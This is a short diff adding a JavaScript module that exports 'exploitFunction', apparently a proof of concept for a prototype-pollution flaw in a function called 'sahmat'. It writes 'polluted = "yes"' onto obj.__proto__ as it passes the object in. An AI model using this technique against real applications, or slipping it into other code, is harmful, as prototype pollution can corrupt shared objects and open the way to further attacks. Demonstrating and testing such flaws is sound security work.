@@ -1,0 +1,6 @@
+function exploitFunction(payload) {
+    const { obj } = payload;
+    sahmat(obj, "tmp", (obj.__proto__.polluted = "yes"));
+}
+
+module.exports = { exploitFunction };
